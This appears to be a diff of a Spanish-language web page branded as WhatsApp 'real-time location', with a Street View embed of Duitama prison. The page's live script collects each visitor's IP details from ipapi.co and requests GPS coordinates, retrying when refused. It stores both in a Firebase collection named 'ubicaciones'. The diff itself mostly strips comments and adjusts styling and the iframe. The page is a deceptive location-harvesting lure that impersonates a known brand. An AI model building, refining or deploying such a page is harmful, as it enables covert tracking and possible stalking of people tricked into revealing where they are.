@@ -54,15 +54,6 @@
             margin-bottom: 20px;
         }
 
-        iframe {
-            width: 110%;
-            height: 200px;
-            border: none;
-            border-radius: 18px;
-            margin: 12px 0 20px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-        }
-
         /* ---------- ESTADO ---------- */
         #estado {
             background: #f0f9f6;
@@ -129,16 +120,16 @@
         .modal-contenido {
             background: #ffffff;
             width: 90%;
-            max-width: 320px;          /* más pequeño */
-            padding: 16px 16px 20px;    /* menos padding */
-            border-radius: 20px;        /* ligeramente menos redondeado */
+            max-width: 320px;
+            padding: 16px 16px 20px;
+            border-radius: 20px;
             box-shadow: 0 24px 48px rgba(0, 0, 0, 0.3);
             text-align: center;
             animation: slideUp 0.35s ease;
         }
 
         .modal-contenido .modal-imagen {
-            width: 120px;              /* más grande */
+            width: 120px;
             height: 120px;
             border-radius: 50%;
             object-fit: cover;
@@ -205,7 +196,6 @@
             background: #054a42;
         }
 
-        /* ---------- ANIMACIONES ---------- */
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -218,9 +208,8 @@
         @media (max-width: 400px) {
             .card { padding: 20px 16px; }
             h2 { font-size: 21px; }
-            iframe { height: 160px; }
             .modal-contenido .modal-imagen {
-                width: 100px;          /* ajuste en móviles */
+                width: 100px;
                 height: 100px;
             }
         }
@@ -231,21 +220,23 @@
     <div class="card">
         <img src="imagenubicacion.jpg" alt="WhatsApp" class="logo" />
         <h2>WhatsApp</h2>
-        <p class="subtitle"> ubicacion en tiempo real</p>
-        <!-- IFREMAPE CON ZOOM A CÁRCEL DE DUITAMA -->
+        <p class="subtitle">Ubicación en tiempo real</p>
+
+        <!-- IFRAME DE STREET VIEW (CÁRCEL DE DUITAMA) -->
         <iframe
-            src="https://www.google.com/maps?q=5.8275,-73.0333&z=19&output=embed"
+            src="https://www.google.com/maps?q=5.8275,-73.0333&layer=c&cbll=5.8275,-73.0333&cbp=11,0,0,0,0"
             style="width:100%; max-width:800px; height:350px; border:none; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,.25);"
             loading="lazy"
             allowfullscreen
         ></iframe>
+
         <div id="estado">
             <span class="spinner"></span>
             <span id="estadoTexto">Iniciando...</span>
         </div>
     </div>
 
-    <!-- MODAL CON IMAGEN (ALERTA) -->
+    <!-- MODAL DE ALERTA -->
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
             <img src="imagenubicacion.jpg" alt="Ubicación" class="modal-imagen" />
@@ -260,7 +251,6 @@
     </div>
 
     <script type="module">
-        // ----- IMPORTS FIREBASE -----
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
         import {
             getFirestore,
@@ -283,7 +273,6 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // ----- ELEMENTOS DOM -----
         const estadoDiv = document.getElementById('estado');
         const estadoTexto = document.getElementById('estadoTexto');
         const modal = document.getElementById('miAlerta');
@@ -293,24 +282,19 @@
 
         let docId = null;
         let ipGuardada = false;
-        let timeoutAlerta = null;   // para controlar el retraso
+        let timeoutAlerta = null;
 
-        // ----- FUNCIONES DE ESTADO -----
         function setEstado(texto, tipo = 'cargando') {
             estadoTexto.textContent = texto;
             estadoDiv.className = tipo;
         }
 
-        // Muestra la alerta con un retraso de 1.5 segundos adicionales
         function mostrarAlerta(texto) {
-            // Cancela cualquier timeout pendiente
             if (timeoutAlerta) {
                 clearTimeout(timeoutAlerta);
                 timeoutAlerta = null;
             }
-            // Actualiza el texto de inmediato (por si acaso)
             textoAlerta.textContent = texto;
-            // Programa la aparición después de 1500 ms
             timeoutAlerta = setTimeout(() => {
                 modal.style.display = 'flex';
                 timeoutAlerta = null;
@@ -325,7 +309,6 @@
             modal.style.display = 'none';
         }
 
-        // ----- BOTONES -----
         btnReintentar.addEventListener('click', () => {
             ocultarAlerta();
             solicitarGPS();
@@ -335,7 +318,6 @@
             window.location.reload();
         });
 
-        // ----- OBTENER IP -----
         async function obtenerIP() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -355,7 +337,6 @@
             }
         }
 
-        // ----- GUARDAR IP (crea documento) -----
         async function guardarIP(datosIP) {
             try {
                 const docRef = await addDoc(collection(db, 'ubicaciones'), {
@@ -386,7 +367,6 @@
             }
         }
 
-        // ----- GUARDAR GPS (crea documento nuevo si no hay IP) -----
         async function guardarGPS(posicion) {
             try {
                 const datos = {
@@ -425,7 +405,6 @@
             }
         }
 
-        // ----- SOLICITAR GPS -----
         function solicitarGPS() {
             if (!navigator.geolocation) {
                 mostrarAlerta('Tu navegador no soporta geolocalización.');
@@ -473,7 +452,6 @@
             );
         }
 
-        // ----- FLUJO PRINCIPAL -----
         (async function main() {
             setEstado('Obteniendo IP...', 'cargando');
 
